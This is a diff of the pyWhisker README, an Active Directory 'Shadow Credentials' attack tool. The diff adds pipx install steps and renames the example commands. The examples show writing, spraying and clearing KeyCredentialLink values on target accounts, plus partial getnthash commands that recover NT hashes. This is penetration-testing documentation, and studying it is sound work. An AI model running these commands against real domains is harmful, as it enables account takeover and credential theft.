@@ -21,6 +21,14 @@ More information about this "Shadow Credentials" primitive:
  - [The Hacker Recipes - ACEs abuse](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries)
  - [The Hacker Recipes - Shadow Credentials](https://www.thehacker.recipes/active-directory-domain-services/movement/access-control-entries/shadow-credentials)
 
+# Installation
+
+```
+sudo apt install pipx
+pipx ensurepath
+pipx install pywhisker
+```
+
 # Usage
 
 pyWhisker can be used to operate various actions on the msDs-KeyCredentialLink attribute of a target:
@@ -45,7 +53,7 @@ Among other things, pyWhisker supports multi-level verbosity, just append `-v`, 
 pyWhisker can also do cross-domain, see the `-td/--target-domain` argument.
 
 ```
-usage: pywhisker.py [-h] (-t TARGET_SAMNAME | -tl TARGET_SAMNAME_LIST) [-a [{list,add,spray,remove,clear,info,export,import}]] [--use-ldaps] [-v] [-q] [--dc-ip ip address] [-d DOMAIN]
+usage: pywhisker [-h] (-t TARGET_SAMNAME | -tl TARGET_SAMNAME_LIST) [-a [{list,add,spray,remove,clear,info,export,import}]] [--use-ldaps] [-v] [-q] [--dc-ip ip address] [-d DOMAIN]
                     [-u USER] [-td TARGET_DOMAIN] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key] [-k] [-P PFX_PASSWORD] [-f FILENAME] [-e {PEM,PFX}] [-D DEVICE_ID]
 
 Python (re)setter for property msDS-KeyCredentialLink for Shadow Credentials attacks.
@@ -99,8 +107,8 @@ Below are examples and screenshots of what pyWhisker can do.
 pyWhisker has the ability to list existing KeyCredentials. In addition to that, it can unfold the whole structure to show every piece of information that object contains (including the RSA public key parameters).
 
 ```shell
-python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
-python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "info" --device-id 6419739b-ff90-f5c7-0737-1331daeb7db6
+pywhisker -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
+pywhisker -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "info" --device-id 6419739b-ff90-f5c7-0737-1331daeb7db6
 ```
 
 ![](./.assets/list_info.png)
@@ -110,13 +118,13 @@ python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target 
 pyWhisker has the ability to remove specific values or clear the whole attribute.
 
 ```shell
-python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id a8ce856e-9b58-61f9-8fd3-b079689eb46e
+pywhisker -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id a8ce856e-9b58-61f9-8fd3-b079689eb46e
 ```
 
 ![](./.assets/remove.png)
 
 ```shell
-python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "clear"
+pywhisker -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "clear"
 ```
 
 ![](./.assets/clear.png)
@@ -128,7 +136,7 @@ pyWhisker has the ability to generate RSA keys, a X509 certificate, a KeyCredent
 ### Example with the PFX format
 
 ```shell
-python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename test1
+pywhisker -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename test1
 ```
 
 ![](./.assets/add_pfx.png)
@@ -145,7 +153,7 @@ python3 PKINITtools/getnthash.py -key f4d6738897808edd3868fa8c60f147366c41016df6
 ### Example with the PEM format
 
 ```shell
-python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename test2 --export PEM
+pywhisker -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename test2 --export PEM
 ```
 
 ![](./.assets/add_pem.png)
@@ -163,7 +171,7 @@ python3 PKINITtools/getnthash.py -key 894fde81fb7cf87963e4bda9e9e288536a0508a155
 pyWhisker can chain multiple KeyCredentials additions, to a set of targets, i.e. spray (if the credentials used have the right permissions).
 
 ```shell
-python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target-list targetlist.txt --action "spray"
+pywhisker -d "domain.local" -u "user1" -p "complexpassword" --target-list targetlist.txt --action "spray"
 ```
 
 ## Import and export
